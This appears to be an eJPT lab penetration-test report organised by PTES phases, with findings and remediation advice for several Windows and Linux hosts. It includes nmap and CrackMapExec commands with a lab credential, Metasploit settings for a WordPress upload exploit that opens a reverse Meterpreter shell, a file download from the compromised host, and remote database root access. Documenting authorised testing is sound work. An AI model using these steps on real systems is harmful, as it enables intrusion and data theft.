# Penetration Testing Assessment Report
## eJPT Practical Assessment — Technical Engagement Record (PTES Standard)

| Document Control | Details |
| :--- | :--- |
| **Assessment Title** | eLearnSecurity Junior Penetration Tester (eJPT) Practical Assessment |
| **Methodology Standard** | Penetration Testing Execution Standard (PTES) |
| **Assessment Type** | Internal Network Penetration Testing & Web Application Security Assessment |
| **Assessment Date** | 13 November 2026 |
| **Prepared By** | Karthik G. |
| **Final Score / Result** | **91% (Passed)** |
| **Classification** | Private — Personal Technical Record |
| **Document Version** | 1.0 (Final) |

---

# 1. Executive Summary

## 1.1 Engagement Overview

A practical penetration testing engagement was conducted on **13 November 2026** against a multi-host enterprise-style lab environment comprising Windows Server and Linux operating systems, web applications (WordPress, Drupal, Microsoft IIS), Windows file-sharing services (SMB), database services (MariaDB), and remote administration interfaces (RDP, WinRM, SSH).

This report is structured in accordance with the **Penetration Testing Execution Standard (PTES)** framework, covering Pre-Engagement Interactions, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation, and Reporting. It reconstructs the technical assessment from retained engagement notes and preserved terminal output. Where an exploitation result or command sequence was not preserved in the raw evidence, it is explicitly classified as *unverified* or *unconfirmed* rather than presented as a confirmed compromise.

## 1.2 Key Technical Findings

During the engagement, multiple high-impact security weaknesses were identified and validated across web application, authentication, database, and network-segmentation layers:

- **Critical Remote Code Execution & SYSTEM Compromise (`WINSERVER-01` — `192.168.100.50`):** An authenticated arbitrary file-upload vulnerability in the *WordPress Responsive Thumbnail Slider (v1.0)* plugin enabled the upload and execution of a PHP Meterpreter payload under Apache, resulting in an interactive session with `NT AUTHORITY\SYSTEM` privileges and retrieval of sensitive host evidence (`flag.txt`).
- **Administrative SMB Access & Dual-Homed Pivot Exposure (`WINSERVER-03` — `192.168.100.55`):** Valid Windows `Administrator` credentials permitted authenticated SMB access to an IIS 10 server that maintained dual-homed connectivity to both the primary assessment subnet and an isolated internal network (`192.168.100.51`, `192.168.100.57`, `192.168.100.61`), creating a critical lateral-movement pivot point.
- **Privileged Remote Database Authentication (`Linux Web Server` — `192.168.100.52`):** Enumeration of an Ubuntu 20.04 host running Drupal 7.57 and MariaDB (3306/tcp) yielded database credentials and confirmed remote `root` database authentication following `FLUSH HOSTS;`.
- **Authenticated SMB Share Access & Legacy Protocol Exposure (`WINSERVER-01` — `192.168.100.50`):** Valid Windows credentials (`mike:diamond`) permitted authenticated SMB share enumeration (`print$` read access), alongside active SMBv1 support and non-enforced SMB signing.
- **Potential Command-Shell Endpoint Exposure (`WINSERVER-02` — `192.168.100.51`):** Web reconnaissance against an IIS 8.5 server identified an exposed `/cmdasp.aspx` ASP.NET endpoint representing a potential command-shell interface.

## 1.3 Risk Distribution Summary

| Severity Level | Count | Finding IDs | Summary of Impact |
| :--- | :---: | :--- | :--- |
| **Critical** | 1 | `F-01` | Full operating-system compromise (`NT AUTHORITY\SYSTEM`) via authenticated web plugin upload |
| **High** | 5 | `F-02`, `F-04`, `F-06`, `F-07`, `F-08` | Privileged SMB/DB access, dual-homed network pivot exposure, SMBv1 enabled, outdated software stack |
| **Medium** | 1 | `F-03` | SMB message signing enabled but not required (relay exposure) |
| **Unconfirmed / Informational** | 1 | `F-05` | Exposed `/cmdasp.aspx` endpoint identified; OS command execution unconfirmed in retained logs |

## 1.4 Assessment Outcome

The engagement concluded with a final **eJPT certification score of 91% (Pass)**, demonstrating practical proficiency across network reconnaissance, service enumeration, web application testing, credential validation, vulnerability exploitation, and post-exploitation analysis.

---

# 2. Pre-Engagement Interactions & PTES Methodology

## 2.1 Scope and Rules of Engagement (PTES Phase 1)

In alignment with **PTES Phase 1 (Pre-Engagement Interactions)**, the assessment operated within a dedicated, isolated examination network environment:

- **Primary Assessment Subnet:** `192.168.100.0/24` (Attacker host at `192.168.100.5`).
- **Secondary Internal Network Context:** Additional internal network segment reachable via dual-homed host `WINSERVER-03` (`192.168.100.55`), containing hosts referenced at `192.168.100.51`, `192.168.100.57`, and `192.168.100.61`.
- **Evidence Integrity Policy:** All findings in this report strictly reflect preserved engagement notes and terminal outputs. Missing command outputs, unpreserved flag strings, or incomplete lateral-movement chains are explicitly documented as limitations in **Appendix A**.
- **Secret Handling:** Sensitive administrative and database passwords discovered during testing are redacted where appropriate in accordance with professional reporting standards.

## 2.2 Penetration Testing Execution Standard (PTES) Lifecycle

The engagement followed the seven formal phases defined by the **Penetration Testing Execution Standard (PTES)**:

| PTES Phase | Phase Name | Operational Execution in Assessment |
| :---: | :--- | :--- |
| **Phase 1** | **Pre-Engagement Interactions** | Defined assessment boundaries, target network ranges, rules of evidence preservation, and reporting classification. |
| **Phase 2** | **Intelligence Gathering** | Performed active host discovery, full TCP port sweeps (`-p-`), service/version fingerprinting (`-sV`), default script execution (`-sC`), virtual host discovery, and SMB/CMS enumeration. |
| **Phase 3** | **Threat Modeling** | Mapped high-value assets, administrative interfaces, credential reuse boundaries, and dual-homed pivot pathways between the primary and internal networks. |
| **Phase 4** | **Vulnerability Analysis** | Identified outdated CMS cores/plugins, exposed administrative files (`wp-config.php`, `todo.txt`, `/cmdasp.aspx`), weak/reused credentials, legacy SMBv1 support, and remote DB access. |
| **Phase 5** | **Exploitation** | Executed authenticated arbitrary file upload via Metasploit (`wp_responsive_thumbnail_slider_upload`), validated SMB credentials via CrackMapExec, and authenticated remotely to MariaDB. |
| **Phase 6** | **Post-Exploitation** | Verified `NT AUTHORITY\SYSTEM` execution context on `WINSERVER-01`, exfiltrated proof file (`flag.txt`), inspected PHP/DB configurations, and analyzed multi-homed routing on `WINSERVER-03`. |
| **Phase 7** | **Reporting** | Compiled structured technical findings, evidence validation matrices, consolidated kill-chain narrative, and prioritized remediation guidance. |

## 2.3 Assessment Toolset

The following tools and utilities were documented during the engagement:

- **Operating Platform:** Kali Linux (Attacking Host: `192.168.100.5`)
- **Network Scanning & Enumeration:** Nmap
- **Exploitation & Post-Exploitation:** Metasploit Framework (`msfconsole`), Meterpreter (`php/meterpreter/reverse_tcp`)
- **SMB & Credential Validation:** CrackMapExec (`crackmapexec`), `smbclient`
- **Web & Protocol Utilities:** cURL, WordPress Administration Portal, WP File Manager (v7.1.4)
- **Database & System Utilities:** MariaDB/MySQL client, standard Linux command-line utilities

---

# 3. Intelligence Gathering & Threat Modeling (PTES Phases 2 & 3)

## 3.1 Identified Network Asset Inventory

Active scanning and service enumeration across the target environment identified six primary hosts on the external/DMZ assessment network, plus an additional internal network context:

| System Identifier | IP Address | Operating System / Platform | Exposed Services & Primary Role | PTES Assessment Status |
| :--- | :--- | :--- | :--- | :--- |
| **WINSERVER-01** | `192.168.100.50` | Windows Server 2012 R2 Standard | HTTP (80 - Apache 2.4.51 / PHP 7.4.26 / WordPress 5.9.3), MSRPC (135), NetBIOS/SMB (139, 445), MariaDB (3307), RDP (3389), WinRM (5985, 47001), Dynamic RPC (49152–49156, 49192) | **Compromised (`SYSTEM`)** |
| **WINSERVER-02** | `192.168.100.51` | Windows Server | HTTP (Microsoft IIS 8.5), ASP.NET (`/cmdasp.aspx`) | **Enumerated (RCE Unconfirmed)** |
| **Linux Web Server** | `192.168.100.52` | Ubuntu 20.04 Linux | HTTP (Drupal 7.57), MariaDB (3306/tcp) | **Remote DB Root Auth Confirmed** |
| **WINSERVER-03** | `192.168.100.55` | Windows Server | HTTP (Microsoft IIS 10, `todo.txt`), SMB (445/tcp), Dual-Homed Network Interface | **Admin SMB Auth & Pivot Identified** |
| **Additional Windows Host** | `192.168.100.63` | Windows Server 2016 | Host identified during network discovery | **Identified (Enumeration Incomplete)** |
| **Additional Linux Host** | `192.168.100.67` | Linux | SSH Service | **Identified (Enumeration Incomplete)** |

### Internal Network Context Note

During post-enumeration analysis of `WINSERVER-03` (`192.168.100.55`), an additional internal network segment was identified containing hosts referenced at `192.168.100.51`, `192.168.100.57`, and `192.168.100.61`.

> **Analytical Note on Address Overlap:** The IP address `192.168.100.51` appears in the primary host inventory as `WINSERVER-02` and is also referenced within the separate internal network notes. In this report, the internal-network reference is treated strictly as a distinct network context and is not assumed to represent the same physical or virtual machine without preserved routing tables.

## 3.2 Threat Modeling & Attack Surface Analysis (PTES Phase 3)

Based on the intelligence gathered in Phase 2, threat modeling prioritized four primary attack vectors:

1. **Web Application & Third-Party Plugin Exploitation:** Content Management Systems (WordPress 5.9.3 on `WINSERVER-01` and Drupal 7.57 on `192.168.100.52`) alongside custom IIS scripts (`/cmdasp.aspx` on `WINSERVER-02`) presented immediate pathways from HTTP exposure to server-side command execution.
2. **Credential Reuse & Authenticated Service Abuse:** User enumeration and configuration harvesting (`wp-config.php`, `todo.txt`) enabled targeted authentication testing against SMB, WinRM, CMS portals, and MariaDB services.
3. **Database Service Exposure:** Network-accessible database listeners (MariaDB on port `3306` on `192.168.100.52` and port `3307` on `192.168.100.50`) exposed backend application data and administrative credentials.
4. **Network Segmentation Bypass (Pivoting):** Dual-homed architecture on `WINSERVER-03` (`192.168.100.55`) combined with administrative SMB credentials created a high-priority bridge between the primary assessment subnet and isolated internal hosts.

---

# 4. Technical Findings & System-by-System Assessment (PTES Phases 4, 5 & 6)

---

## 4.1 WINSERVER-01 — `192.168.100.50`

| System Attribute | Technical Detail |
| :--- | :--- |
| **IP Address / Virtual Host** | `192.168.100.50` (`wordpress.local`) |
| **Operating System** | Windows Server 2012 R2 Standard |
| **Web Stack** | Apache 2.4.51 (Win64), PHP 7.4.26 |
| **Application** | WordPress 5.9.3 (Site Title: *Syntex*) |
| **PTES Phase Outcome** | **Confirmed Exploitation & Post-Exploitation (`NT AUTHORITY\SYSTEM`)** |
| **Maximum Finding Severity** | **Critical** |

### 4.1.1 Intelligence Gathering & Service Enumeration (PTES Phase 2)

A full-port TCP service and script scan was executed against `192.168.100.50`:

```bash
nmap -sC -sV -p- --min-rate 1000 192.168.100.50
```

#### Identified Open Ports and Services

| Port | Protocol | Service | Observed Version / Enumeration Details |
| :--- | :---: | :--- | :--- |
| `80` | TCP | HTTP | Apache 2.4.51 (Win64), PHP 7.4.26 — WordPress 5.9.3 (*Syntex*) |
| `135` | TCP | MSRPC | Microsoft Windows RPC |
| `139` | TCP | NetBIOS-SSN | Microsoft Windows netbios-ssn (SMB over NetBIOS) |
| `445` | TCP | Microsoft-DS | Windows Server 2012 R2 SMB file-sharing service |
| `3307` | TCP | MySQL / MariaDB | MariaDB database service (non-standard port) |
| `3389` | TCP | ms-wbt-server | Microsoft Terminal Services (RDP) |
| `5985` | TCP | WinRM | Microsoft HTTPAPI httpd 2.0 (WinRM HTTP) |
| `47001` | TCP | WinRM | Windows Remote Management service |
| `49152–49156` | TCP | MSRPC | Windows Dynamic RPC ports |
| `49192` | TCP | MSRPC | Windows Dynamic RPC port |

Additional SMB protocol enumeration established:

- **OS Identification:** Windows Server 2012 R2 Standard.
- **SMB Signing:** Enabled, but **not required** (permitting potential SMB relay attacks).
- **SMBv1 Status:** Legacy **SMBv1 protocol enabled**.

### 4.1.2 Web Application & Configuration Enumeration (PTES Phase 2 & 4)

Enumeration of the HTTP service on port `80/tcp` identified a WordPress installation bound to the virtual host `wordpress.local`:

| Component | Identified Detail |
| :--- | :--- |
| **CMS Core** | WordPress 5.9.3 |
| **Site Title** | Syntex |
| **Virtual Host** | `wordpress.local` |
| **Web Server / Runtime** | Apache 2.4.51 (Win64) / PHP 7.4.26 |
| **Active Plugin 1** | Burger Companion `v4.8` |
| **Active Plugin 2** | WordPress Responsive Thumbnail Slider `v1.0` |
| **Active Plugin 3** | WP File Manager `v7.1.4` |

Using valid WordPress administrative credentials available during the assessment, authenticated access to the WordPress dashboard was achieved. Through the active **WP File Manager (v7.1.4)** plugin, the underlying web root directory was inspected, exposing `wp-config.php` with the following MariaDB configuration:

- **Database Name:** `wordpress`
- **Database User:** `root`
- **Database Password:** *(empty / blank password)*
- **Database Host:** `localhost:3307`

Furthermore, PHP runtime diagnostic inspection confirmed that `disable_functions` was completely empty and the PHP `sockets` extension was enabled—creating an unrestricted environment for PHP-based reverse shells and Meterpreter payloads.

### 4.1.3 SMB Enumeration & Credential Validation (PTES Phase 4)

User enumeration against `WINSERVER-01` identified five local accounts:

- `Administrator`
- `Guest`
- `mike`
- `vince`
- `admin`

Authenticated SMB validation was performed using **CrackMapExec** with credentials for the user `mike`:

```bash
crackmapexec smb 192.168.100.50 -u mike -p diamond --shares
```

#### SMB Share Enumeration Results

| Share Name | Access Level (`mike`) | Notes |
| :--- | :--- | :--- |
| `ADMIN$` | No Access | Administrative remote admin share |
| `C$` | No Access | Administrative disk share |
| `IPC$` | Read / IPC | Inter-process communication share |
| `print$` | **READ** | Printer driver share accessible to `mike` |

Testing confirmed that `mike:diamond` provided valid standard-user SMB authentication (`print$` READ access) but did **not** hold local Administrator privileges and was not permitted to authenticate via WinRM.

### 4.1.4 Vulnerability Analysis (PTES Phase 4)

Analysis of the installed WordPress plugins identified a critical vulnerability in **WordPress Responsive Thumbnail Slider v1.0**:

- **Vulnerability Type:** Authenticated Arbitrary File Upload leading to Remote Code Execution (RCE).
- **Metasploit Module:** `exploit/multi/http/wp_responsive_thumbnail_slider_upload`
- **Mechanism:** The plugin fails to properly restrict uploaded file extensions or enforce server-side execution blocks in the upload directory, allowing an authenticated WordPress administrator to upload an arbitrary `.php` payload and trigger it over HTTP.
- **Privilege Context:** Because Apache 2.4.51 on `WINSERVER-01` was configured to run under the local system service account (`NT AUTHORITY\SYSTEM`), any code executed by the web server inherited full operating-system privileges immediately upon execution.

### 4.1.5 Exploitation (PTES Phase 5)

The vulnerability was exploited using the Metasploit Framework (`exploit/multi/http/wp_responsive_thumbnail_slider_upload`) with the following parameters:

| Parameter | Configured Value | Description |
| :--- | :--- | :--- |
| `RHOSTS` | `192.168.100.50` | Target host IP address |
| `RPORT` | `80` | Target HTTP port |
| `TARGETURI` | `/` | Base WordPress application path |
| `VHOST` | `wordpress.local` | Target virtual host header |
| `PAYLOAD` | `php/meterpreter/reverse_tcp` | PHP Meterpreter reverse TCP stager |
| `LHOST` | `192.168.100.5` | Attacking Kali Linux listener IP |
| `LPORT` | `4446` | Attacking listener port |

#### Exploitation Execution Sequence

1. Authenticated to WordPress (`wordpress.local`) using the `admin` account.
2. Invoked the vulnerable image-upload routine inside *WordPress Responsive Thumbnail Slider v1.0*.
3. Uploaded the PHP Meterpreter reverse-TCP payload into the web-accessible uploads directory.
4. Issued an HTTP request to the uploaded PHP script to trigger server-side execution under Apache.
5. Received the reverse TCP stage on `192.168.100.5:4446` and established an interactive Meterpreter session.

#### Preserved Exploitation Output

```text
[+] Logged into WordPress with admin:...
[+] Successful upload
[*] Sending stage (39282 bytes) to 192.168.100.50
[*] Meterpreter session opened
```

Session inspection confirmed the runtime architecture and privilege level:

```text
meterpreter php/windows
SYSTEM @ WINSERVER-01
```

### 4.1.6 Post-Exploitation & Evidence Collection (PTES Phase 6)

With an active `SYSTEM @ WINSERVER-01` Meterpreter session established, post-exploitation enumeration was performed across local user directories. A target flag file was located inside user `mike`'s Documents folder and exfiltrated to the attacking host:

```text
download C:\\Users\\mike\\Documents\\flag.txt /tmp/flag.txt
```

- **Transfer Verification:** The preserved Meterpreter output confirmed that a **34-byte file** (`flag.txt`) was downloaded successfully to `/tmp/flag.txt`.
- **Evidence Preservation Note:** While the file transfer confirmation and byte size (`34 bytes`) were preserved in the engagement logs, the cleartext string inside `flag.txt` was not retained in the notes and is therefore omitted in accordance with **Appendix A**.

### 4.1.7 Subsequent Validation & Troubleshooting Observations

During subsequent repeatability testing, later runs of the Metasploit module successfully authenticated to WordPress and uploaded the PHP file, but returned an `HTTP 500 Internal Server Error` when requesting the generated Meterpreter stager.

To isolate the cause, a lightweight diagnostic PHP script was uploaded and requested directly, returning:

```text
PHP_OK
```

This confirmed that the Apache/PHP engine continued to execute standard PHP scripts properly and that the `HTTP 500` error was specific to the generated Meterpreter stager state rather than a remediation or loss of PHP execution capability. The earlier confirmed `SYSTEM @ WINSERVER-01` session and 34-byte `flag.txt` exfiltration remain fully validated.

### 4.1.8 Security Impact & Remediation (PTES Phase 7)

- **Impact Summary:** Complete compromise of host confidentiality, integrity, and availability. An attacker with WordPress administrative access achieves immediate `NT AUTHORITY\SYSTEM` control over the Windows Server 2012 R2 operating system, local MariaDB instance (`localhost:3307`), and local filesystem.
- **Remediation Recommendations:**
  1. **Remove Vulnerable Plugins:** Immediately uninstall *WordPress Responsive Thumbnail Slider v1.0* and remove unused plugins (*WP File Manager v7.1.4*, *Burger Companion v4.8*).
  2. **Harden Web Upload Directories:** Disable PHP execution within `/wp-content/uploads/` via Apache directory directives (`php_flag engine off` or `<FilesMatch "\.php$"> Require all denied </FilesMatch>`).
  3. **Enforce Service Account Least Privilege:** Reconfigure the Apache Windows service to run under a dedicated, low-privilege local or Managed Service Account rather than `LocalSystem` (`NT AUTHORITY\SYSTEM`).
  4. **Secure Database & PHP Configuration:** Set a strong password for the MariaDB `root` user on port `3307`, bind MariaDB strictly to `127.0.0.1`, and populate `disable_functions` in `php.ini` (`exec`, `passthru`, `shell_exec`, `system`, `proc_open`, `popen`).
  5. **Harden SMB & OS Stack:** Disable SMBv1 (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`), require SMB signing (`-RequireSecuritySignature $true`), rotate the `mike` account password, and upgrade Windows Server 2012 R2, Apache, PHP, and WordPress to supported releases.

---

## 4.2 WINSERVER-02 — `192.168.100.51`

| System Attribute | Technical Detail |
| :--- | :--- |
| **IP Address** | `192.168.100.51` |
| **Operating System** | Microsoft Windows Server |
| **Web Server** | Microsoft IIS 8.5 |
| **Identified Endpoint** | `/cmdasp.aspx` |
| **PTES Phase Outcome** | **Surface Enumeration & Vulnerability Identification (Exploitation Unconfirmed)** |
| **Finding Classification** | **Unconfirmed (Potentially High/Critical if Active)** |

### 4.2.1 Intelligence Gathering & Enumeration (PTES Phase 2)

Service and web content discovery against `192.168.100.51` identified a Windows Server running **Microsoft IIS 8.5**. Directory and file enumeration revealed an ASP.NET script located at:

```text
/cmdasp.aspx
```

### 4.2.2 Vulnerability Analysis & Exploitation Investigation (PTES Phase 4 & 5)

In standard penetration testing scenarios, `cmdasp.aspx` is a classic ASP.NET web shell designed to accept operating-system commands via HTTP form parameters and execute them under the IIS Application Pool identity.

During the assessment, `/cmdasp.aspx` was flagged and investigated as a primary candidate for remote command execution. However, the retained assessment notes do not preserve the HTTP response bodies, authentication requirements, or command execution outputs from interacting with `/cmdasp.aspx`. Consequently, in strict adherence to evidence accuracy standards, `WINSERVER-02` is classified as having an **identified potential command-shell endpoint**, without claiming confirmed operating-system compromise.

### 4.2.3 Security Impact & Remediation (PTES Phase 7)

- **Impact Summary:** If functional and accessible, an exposed ASP.NET command shell allows unauthenticated or weakly authenticated remote attackers to execute arbitrary OS commands on the IIS host.
- **Remediation Recommendations:**
  1. **Remove Unauthorized Web Shells:** Immediately delete `/cmdasp.aspx` and audit the entire IIS web root (`C:\inetpub\wwwroot\`) for unauthorized `.aspx`, `.asp`, or diagnostic scripts.
  2. **File Integrity Monitoring (FIM):** Deploy FIM controls on web directories to detect unauthorized script creation.
  3. **Review IIS Logs:** Inspect IIS W3C access logs (`%SystemDrive%\inetpub\logs\LogFiles`) for historical `POST` or `GET` requests targeting `/cmdasp.aspx`.
  4. **Application Pool Hardening:** Ensure IIS Application Pools run under isolated, least-privilege `ApplicationPoolIdentity` accounts.

---

## 4.3 Linux Web Server — `192.168.100.52`

| System Attribute | Technical Detail |
| :--- | :--- |
| **IP Address** | `192.168.100.52` |
| **Operating System** | Ubuntu 20.04 Linux |
| **Web Application** | Drupal 7.57 |
| **Database Service** | MariaDB (`3306/tcp`) |
| **PTES Phase Outcome** | **Credential Discovery & Remote Privileged Database Authentication Confirmed** |
| **Maximum Finding Severity** | **High** |

### 4.3.1 Intelligence Gathering & Enumeration (PTES Phase 2)

Enumeration of `192.168.100.52` identified an **Ubuntu 20.04** Linux host running a web server and a network-accessible database service:

| Component | Observed Detail |
| :--- | :--- |
| **Operating System** | Ubuntu 20.04 |
| **Content Management System** | Drupal 7.57 |
| **Database Engine** | MariaDB |
| **Exposed Database Port** | `3306/tcp` |
| **Application Database** | Drupal backend database |

### 4.3.2 Vulnerability Analysis & Credential Validation (PTES Phase 4 & 5)

During application and configuration investigation, database authentication credentials were uncovered:

- **Application Database Account:** `drupal` (password recorded in original private engagement notes; redacted here).
- **Database Administrative Account:** `root` (remote authentication validated over `3306/tcp`).

During testing, remote connection state restrictions on MariaDB were cleared by executing:

```sql
FLUSH HOSTS;
```

Following `FLUSH HOSTS;`, remote MariaDB authentication from the assessment environment (`192.168.100.5`) using the privileged **`root`** database account over port `3306/tcp` was confirmed.

### 4.3.3 Security Impact & Remediation (PTES Phase 7)

- **Impact Summary:** Remote `root` access to the MariaDB service exposes all hosted databases—including the Drupal 7.57 user table, password hashes, session tokens, and site content—to complete read/write manipulation. Furthermore, depending on `secure_file_priv` settings, remote `root` database access can potentially be leveraged for local file reads (`LOAD_FILE`) or web shell writes (`INTO OUTFILE`). *(Note: Post-authentication table dumps and OS-level shell escalation were not preserved in the retained notes.)*
- **Remediation Recommendations:**
  1. **Restrict Database Network Binding:** Configure MariaDB (`my.cnf` / `50-server.cnf`) with `bind-address = 127.0.0.1` so the database only accepts local loopback connections from the co-hosted Drupal application.
  2. **Revoke Remote Root Grants:** Remove wildcard or remote host grants for the `root` database user (`DROP USER 'root'@'%'; FLUSH PRIVILEGES;`).
  3. **Rotate Database Credentials:** Rotate passwords for both `root` and `drupal` database accounts and enforce strong, unique credentials.
  4. **Patch CMS & OS:** Upgrade Drupal 7.57 (which has known historical vulnerabilities such as Drupalgeddon2 / CVE-2018-7600) to a currently supported Drupal release and apply Ubuntu security updates.

---

## 4.4 WINSERVER-03 — `192.168.100.55`

| System Attribute | Technical Detail |
| :--- | :--- |
| **IP Address** | `192.168.100.55` |
| **Operating System** | Microsoft Windows Server |
| **Web Server** | Microsoft IIS 10.0 |
| **Exposed Services** | HTTP (`todo.txt`), SMB (`445/tcp`) |
| **Network Role** | Dual-Homed Host (Bridge between DMZ/External Subnet and Internal Network) |
| **PTES Phase Outcome** | **Administrative SMB Authentication Confirmed; Internal Pivot Topology Identified** |
| **Maximum Finding Severity** | **High** |

### 4.4.1 Intelligence Gathering & Enumeration (PTES Phase 2)

Reconnaissance against `192.168.100.55` identified a Windows Server running **Microsoft IIS 10.0** and exposing Windows SMB file-sharing services. Web content discovery identified an exposed text artifact on the web server:

```text
/todo.txt
```

### 4.4.2 Credential Validation & Administrative Access (PTES Phase 4 & 5)

During the assessment, a valid Windows **`Administrator`** credential pair was identified and validated against `WINSERVER-03` via SMB (`445/tcp`). *(The cleartext password is redacted in this report.)*

Unlike the standard-user SMB access (`mike`) observed on `WINSERVER-01`, the validated credentials on `WINSERVER-03` confirmed **full Administrative SMB authentication**, which typically permits read/write access to administrative shares (`ADMIN$`, `C$`) and remote service/command execution via PSExec, WMIExec, or SMBExec.

### 4.4.3 Post-Exploitation Topology & Pivot Potential (PTES Phase 6)

Network topology investigation established that `WINSERVER-03` was **dual-homed**, maintaining active network interfaces connected to:

1. **Primary Assessment Network (DMZ / External Subnet):** `192.168.100.0/24` (via `192.168.100.55`)
2. **Isolated Internal Network Context:** Containing internal hosts referenced at:
   - `192.168.100.51` *(separate internal network context)*
   - `192.168.100.57`
   - `192.168.100.61`

While the exact Metasploit `autoroute` / `portfwd` or proxy commands and the final exploitation status of the three internal hosts were not preserved in the raw notes, confirming administrative SMB credentials on a dual-homed boundary server establishes a critical lateral-movement pathway.

### 4.4.4 Security Impact & Remediation (PTES Phase 7)

- **Impact Summary:** Administrative SMB compromise on a dual-homed server collapses network segmentation between the DMZ and internal infrastructure, enabling an attacker to pivot traffic into otherwise unreachable internal systems (`192.168.100.51`, `192.168.100.57`, `192.168.100.61`).
- **Remediation Recommendations:**
  1. **Rotate Administrative Credentials:** Immediately rotate the local `Administrator` password on `WINSERVER-03` and implement Microsoft Local Administrator Password Solution (LAPS) to prevent credential reuse across hosts.
  2. **Enforce Strict Network Segmentation:** Avoid dual-homing web servers across DMZ and internal zones. Place a stateful firewall between segments and restrict SMB (`445/tcp`, `139/tcp`) and RPC (`135/tcp`) traffic across network boundaries.
  3. **Remove Sensitive Web Artifacts:** Remove `/todo.txt` and any operational notes or internal infrastructure references from web-accessible directories.
  4. **Disable Unnecessary IP Forwarding:** Ensure IP routing/forwarding is disabled across network adapters unless explicitly required and inspected by a firewall.

---

## 4.5 Additional Identified Systems (`192.168.100.63` & `192.168.100.67`)

Two additional hosts were identified on the primary assessment network during Phase 2 reconnaissance:

| Host IP Address | Identified Platform / Service | Preserved Assessment Status |
| :--- | :--- | :--- |
| `192.168.100.63` | Windows Server 2016 | Host identified during network discovery; detailed port enumeration and exploitation notes not preserved. |
| `192.168.100.67` | Linux (SSH service exposed) | Host and SSH service identified; detailed enumeration and credential testing notes not preserved. |

In accordance with PTES reporting accuracy, these hosts are documented in the network asset inventory to provide a complete view of the discovered environment, without assigning unverified vulnerability or compromise claims.

---

# 5. Consolidated PTES Attack Narrative & Kill Chain

The diagram and phase breakdown below reconstruct the logical progression of the assessment across the PTES lifecycle based on confirmed technical evidence.

```
[Phase 2: Intelligence Gathering]
   ├── Nmap Full TCP & Script Scans (192.168.100.50, .51, .52, .55, .63, .67)
   ├── Web Stack & VHost Discovery (wordpress.local, /cmdasp.aspx, Drupal 7.57, /todo.txt)
   └── SMB & User Enumeration (Administrator, Guest, mike, vince, admin)
          │
          ▼
[Phase 3 & 4: Threat Modeling & Vulnerability Analysis]
   ├── WINSERVER-01: WP File Manager v7.1.4 -> wp-config.php (root:<empty>@localhost:3307)
   ├── WINSERVER-01: WP Responsive Thumbnail Slider v1.0 (Authenticated Arbitrary File Upload)
   ├── WINSERVER-01: SMBv1 Enabled + SMB Signing Not Required + Valid user (mike:diamond)
   ├── Linux Server (.52): Exposed MariaDB (3306/tcp) + Privileged DB Credentials
   └── WINSERVER-03 (.55): Valid Administrator SMB Credentials + Dual-Homed Network Interfaces
          │
          ▼
[Phase 5: Exploitation]
   ├── WINSERVER-01: Metasploit wp_responsive_thumbnail_slider_upload -> php/meterpreter/reverse_tcp
   ├── WINSERVER-01: CrackMapExec SMB Auth (mike:diamond -> print$ READ)
   ├── Linux Server (.52): Remote MariaDB root Login Confirmed (after FLUSH HOSTS;)
   └── WINSERVER-03 (.55): Authenticated Administrator SMB Session Confirmed
          │
          ▼
[Phase 6: Post-Exploitation & Pivoting Analysis]
   ├── WINSERVER-01: Interactive Meterpreter Session as NT AUTHORITY\SYSTEM
   ├── WINSERVER-01: Exfiltrated C:\Users\mike\Documents\flag.txt (34 bytes) -> /tmp/flag.txt
   └── WINSERVER-03 (.55): Mapped Dual-Homed Connectivity to Internal Hosts (.51, .57, .61)
```

---

# 6. Consolidated Findings Register

The table below registers all technical findings identified during the engagement, mapped to their corresponding PTES phase and indicative severity rating:

| ID | Target System | Finding Title | PTES Phase | Severity | Evidence Status |
| :---: | :--- | :--- | :--- | :---: | :--- |
| **F-01** | `WINSERVER-01` (`192.168.100.50`) | Authenticated Arbitrary File Upload in WordPress Plugin Leading to `SYSTEM` Code Execution | Phase 5 & 6 | **Critical** | Confirmed (`SYSTEM` Session & Flag Download) |
| **F-02** | `WINSERVER-01` (`192.168.100.50`) | Legacy SMBv1 Protocol Enabled | Phase 4 | **High** | Confirmed (Nmap / SMB Enumeration) |
| **F-03** | `WINSERVER-01` (`192.168.100.50`) | SMB Message Signing Enabled But Not Required | Phase 4 | **Medium** | Confirmed (Nmap / SMB Enumeration) |
| **F-04** | `WINSERVER-01` (`192.168.100.50`) | Outdated Web Stack (WordPress 5.9.3, PHP 7.4.26, Apache 2.4.51) and Vulnerable Plugins | Phase 4 | **High** | Confirmed (Version & Plugin Audit) |
| **F-05** | `WINSERVER-02` (`192.168.100.51`) | Exposed Potential ASP.NET Command-Shell Endpoint (`/cmdasp.aspx`) | Phase 2 & 4 | **Unconfirmed** | Endpoint Confirmed; RCE Output Not Retained |
| **F-06** | `Linux Web Server` (`192.168.100.52`) | Remote MariaDB Authentication Permitted Using Privileged `root` Account (`3306/tcp`) | Phase 5 | **High** | Confirmed (`FLUSH HOSTS;` & Remote Login) |
| **F-07** | `WINSERVER-03` (`192.168.100.55`) | Validated Administrative SMB Authentication (`Administrator`) | Phase 5 | **High** | Confirmed (SMB Credential Validation) |
| **F-08** | `WINSERVER-03` (`192.168.100.55`) | Dual-Homed Server Architecture Exposing Internal Subnet (`192.168.100.51`, `.57`, `.61`) | Phase 6 | **High** | Confirmed (Topology Notes; Full Pivot Chain Unretained) |

*Note: Severity ratings represent technical risk assessments derived from the preserved engagement evidence rather than formal CVSS v3.1 vector calculations.*

---

# 7. Evidence and Validation Summary

To maintain strict distinction between verified outcomes and unpreserved artifacts, the table below summarizes the evidentiary basis for each system:

| System | IP Address | Retained Technical Evidence | Confirmed Assessment Outcome |
| :--- | :--- | :--- | :--- |
| **WINSERVER-01** | `192.168.100.50` | Full Nmap command & port table, WordPress plugin list, `wp-config.php` DB settings, CrackMapExec command (`mike:diamond`), Metasploit config & console output, `SYSTEM @ WINSERVER-01` session banner, 34-byte `flag.txt` download log, `PHP_OK` diagnostic verification | **Full OS Compromise (`NT AUTHORITY\SYSTEM`) & Authenticated SMB Access** |
| **WINSERVER-02** | `192.168.100.51` | IIS 8.5 fingerprinted; `/cmdasp.aspx` endpoint path recorded | **Potential Web Shell Identified; OS Compromise Unconfirmed** |
| **Linux Web Server** | `192.168.100.52` | Ubuntu 20.04 & Drupal 7.57 identified; MariaDB `3306/tcp` enumerated; `drupal` DB user noted; remote `root` login confirmed after `FLUSH HOSTS;` | **Remote Privileged Database Access Confirmed** |
